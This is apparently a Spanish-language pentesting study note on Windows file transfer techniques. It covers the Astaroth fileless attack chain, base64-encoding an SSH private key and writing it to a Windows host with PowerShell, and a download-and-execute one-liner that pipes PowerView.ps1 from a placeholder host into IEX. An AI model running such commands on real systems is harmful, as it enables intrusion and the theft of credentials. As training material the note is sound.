---
{"-publish":true,"permalink":"/windows/metodos-de-transferencia-en-windows/","PassFrontmatter":true}
---


### Introducción:

El sistema operativo Windows ha evolucionado durante los últimos años y las nuevas versiones vienen con diferentes utilidades para las `operaciones de transferencia de archivos`
Por eso, comprender la transferencia de archivos en Windows puede ayudar tanto a los atacantes como a los que defienden.
Los atacantes utilizan métodos de transferencia de archivos para operar y evitar ser atrapados. `Los defensores pueden aprender como funcionan estos métodos` para **supervisar** y **crear políticas** para evitar verse comprometidos.

##### Amenazas sin archivos:
- `Fileless`: Este término indica que una amenaza no viene de un archivo, sino que *utilizan herramientas legítimas* integradas en un sistema para ejecutar un ataque. `Esto no significa que no haya una transferencia de archivos`.
---
- `Astaroth-Attack`: Por lo general, seguía estos pasos: Un enlace malicioso en un correo electrónico de spear-phising conducía a un archivo LNK. Al hacer doble clic, el archivo LNK provocaba la ejecución de la `herramienta WMIC` con el parámetro `/format`, que permitía la descarga y ejecución de código JavaScript malicioso. A su vez, el código descargaba cargas útiles abusando de la herramienta Bitsadmin.

![Pasted image 20250611214111.png](/img/user/Pasted%20image%2020250611214111.png)

---

## Codificación y Decodificación de PowerShell Base64:

Dependiendo del tamaño del archivo que queramos transferir, podemos utilizar varios métodos que no requieran comunicación de red. Si tenemos acceso a un terminal, podemos codificar un archivo en una cadena (string) de base64, copiar su contenido desde el terminal y realizar la operación de manera inversa, decodificando el fichero en el contenido original. Veamos cómo podemos hacer esto con PowerShell.

Un paso esencial en el uso de este método es asegurarse de que el archivo que codifica y decodifica es correcto. Podemos usar `md5sum`, un programa que calcula y verifica sumas de comprobación MD5 de 128 BITS. El hash MD5 funciona como una huella digital, lo que significa que un archivo debe tener el mismo hash MD5 en todas partes.

###### Ejemplo:

![Pasted image 20250611214940.png](/img/user/Pasted%20image%2020250611214940.png)
- Pwnbox Check SSH Key MD5 Hash 
``` c
MrBloody01@htb[/htb]$ md5sum id_rsa

4e301756a07ded0a2dd6953abf015278  id_rsa
```

- Clave SSH de codificación Pwnbox en Base64
``` c
MrBloody01@htb[/htb]$ cat id_rsa |base64 -w 0;echo

LS0tLS1CRUdJTiBPUEVOU1NIIFBSSVZBVEUgS0VZLS0tLS0KYjNCbGJuTnphQz...
```

Podemos copiar este contenido y pegarlo en un terminal de Windows PowerShell y usar algunas funciones de PowerShell para decodificarlo.

###### Métodos de transferencia de archivos de Windows:
``` PowerShell
PS C:\htb> [IO.File]::WriteAllBytes("C:\Users\Public\id_rsa", [Convert]::FromBase64String("LS0tLS1CRUdJTiBPUEVOU1NIIFBSSVZBVEUgS0VZLS0tLS0KYjNCbGJuTnphQzFyWlhrdGRqRUFBQUFBQkc1dmJtVUFBQUFFYm05dVpRQUFBQUFBQUFBQkFBQUFsd0FBQUFkemMyZ3RjbgpOaEFBQUFBd0VBQVFBQUFJRUF6WjE0dzV1NU9laHR5SUJQSkg3Tm9Yai84YXNHRUcxcHpJbmtiN2hIMldRVGpMQWRYZE9kCno3YjJtd0tiSW56VmtTM1BUR3ZseGhDVkRRUmpBYzloQ3k1Q0duWnlLM3U2TjQ3RFhURFY0YUtkcXl0UTFUQXZZUHQwWm8KVWh2bEo5YUgxclgzVHUxM2FRWUNQTVdMc2JOV2tLWFJzSk11dTJONkJoRHVmQThhc0FBQUlRRGJXa3p3MjFwTThBQUFBSApjM05vTFhKellRQUFBSUVBeloxNHc1dTVPZWh0eUlCUEpIN05vWGovOGFzR0VHMXB6SW5rYjdoSDJXUVRqTEFkWGRPZHo3CmIybXdLYkluelZrUzNQVEd2bHhoQ1ZEUVJqQWM5aEN5NUNHblp5SzN1Nk40N0RYVERWNGFLZHF5dFExVEF2WVB0MFpvVWgKdmxKOWFIMXJYM1R1MTNhUVlDUE1XTHNiTldrS1hSc0pNdXUyTjZCaER1ZkE4YXNBQUFBREFRQUJBQUFBZ0NjQ28zRHBVSwpFdCtmWTZjY21JelZhL2NEL1hwTlRsRFZlaktkWVFib0ZPUFc5SjBxaUVoOEpyQWlxeXVlQTNNd1hTWFN3d3BHMkpvOTNPCllVSnNxQXB4NlBxbFF6K3hKNjZEdzl5RWF1RTA5OXpodEtpK0pvMkttVzJzVENkbm92Y3BiK3Q3S2lPcHlwYndFZ0dJWVkKZW9VT2hENVJyY2s5Q3J2TlFBem9BeEFBQUFRUUNGKzBtTXJraklXL09lc3lJRC9JQzJNRGNuNTI0S2NORUZ0NUk5b0ZJMApDcmdYNmNoSlNiVWJsVXFqVEx4NmIyblNmSlVWS3pUMXRCVk1tWEZ4Vit0K0FBQUFRUURzbGZwMnJzVTdtaVMyQnhXWjBNCjY2OEhxblp1SWc3WjVLUnFrK1hqWkdqbHVJMkxjalRKZEd4Z0VBanhuZEJqa0F0MExlOFphbUt5blV2aGU3ekkzL0FBQUEKUVFEZWZPSVFNZnQ0R1NtaERreWJtbG1IQXRkMUdYVitOQTRGNXQ0UExZYzZOYWRIc0JTWDJWN0liaFA1cS9yVm5tVHJRZApaUkVJTW84NzRMUkJrY0FqUlZBQUFBRkhCc1lXbHVkR1Y0ZEVCamVXSmxjbk53WVdObEFRSURCQVVHCi0tLS0tRU5EIE9QRU5TU0ggUFJJVkFURSBLRVktLS0tLQo="))

```

Finalmente, podemos confirmar si el archivo se transfirió correctamente usando el `cmdlet Get-FileHash` , que hace lo mismo que `md5sum` hace. 

---
###### Confirmación de la coincidencia de hashes MD5:
![Pasted image 20250611220703.png](/img/user/Pasted%20image%2020250611220703.png)

## Descargas web de PowerShell:

La mayoría de las empresas permiten HTTP y HTTPS Tráfico saliente a través del firewall para permitir la productividad de los empleados. Aprovechar estos métodos de transporte para las operaciones de transferencia de archivos es muy conveniente. Aun así, los defensores pueden utilizar soluciones de filtrado web para impedir el acceso a categorías específicas de sitios web, bloquear la descarga de tipos de archivos (como .exe) o sólo permitir el acceso a una lista de dominios incluidos en la lista blanca en redes más restringidas.

En cualquier versión de PowerShell, la clase `System.Net.WebClient` se puede usar para descargar un archivo a través de `HTTP`, `HTTPS`, o `FTP`. En la *tabla* siguiente se describen los métodos `WebClient` para descargar datos de un recurso.

![Pasted image 20250611221222.png](/img/user/Pasted%20image%2020250611221222.png)

---
![Pasted image 20250611221326.png](/img/user/Pasted%20image%2020250611221326.png)

---------

![Pasted image 20250611221419.png](/img/user/Pasted%20image%2020250611221419.png)

---

### Errores comunes con PowerShell:

Puede haber casos en los que la configuración del primer inicio de Internet Explorer no se haya completado, lo que impide la descarga. 

![Pasted image 20250611221615.png](/img/user/Pasted%20image%2020250611221615.png)

Esto se puede omitir usando el parámetro `-UseBasicParsing.`
``` PowerShell
PS C:\htb> Invoke-WebRequest https://<ip>/PowerView.ps1 | IEX

Invoke-WebRequest : The response content cannot be parsed because the Internet Explorer engine is not available, or Internet Explorer's first-launch configuration is not complete. Specify the UseBasicParsing parameter and try again.
At line:1 char:1
+ Invoke-WebRequest https://raw.githubusercontent.com/PowerShellMafia/P ...
+ ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+ CategoryInfo : NotImplemented: (:) [Invoke-WebRequest], NotSupportedException
+ FullyQualifiedErrorId : WebCmdletIEDomNotSupportedException,Microsoft.PowerShell.Commands.InvokeWebRequestCommand

PS C:\htb> Invoke-WebRequest https://<ip>/PowerView.ps1 -UseBasicParsing | IEX
```


---

# Cheatsheet File Transfer Windows


![Pasted image 20250613042024.png](/img/user/Pasted%20image%2020250613042024.png)
![Pasted image 20250613042057.png](/img/user/Pasted%20image%2020250613042057.png)

---
#file-transfer #windows 

---
